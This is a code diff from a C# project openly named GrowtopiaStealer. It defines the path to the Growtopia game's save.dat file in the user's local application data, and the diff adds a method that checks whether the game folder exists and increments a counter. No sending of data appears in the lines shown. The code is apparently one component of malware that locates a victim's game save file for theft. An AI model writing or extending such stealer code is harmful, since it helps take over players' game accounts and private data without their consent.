@@ -1,15 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.IO;
-using System.Net;
-using System.Text.RegularExpressions;
 
-namespace GrowtopiaStealer
+namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
 {
-    class Growtopia // https://github.com/TheC0mpany/GrowtopiaStealer
+    class Growtopia
     {
         #region Growtopia Paths
         // Growtopia folder path
@@ -17,5 +11,13 @@ namespace GrowtopiaStealer
         // Growtopia save.dat path
         public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
         #endregion
+        public static void GrowtopiaExistOrNo()
+        {
+                DirectoryInfo growtopia = new DirectoryInfo(Path.Combine(dirPath));
+            // Stop if not exists
+            if (!growtopia.Exists)
+                return;
+        Counting.Growtopia++;
+        }
     }
 }
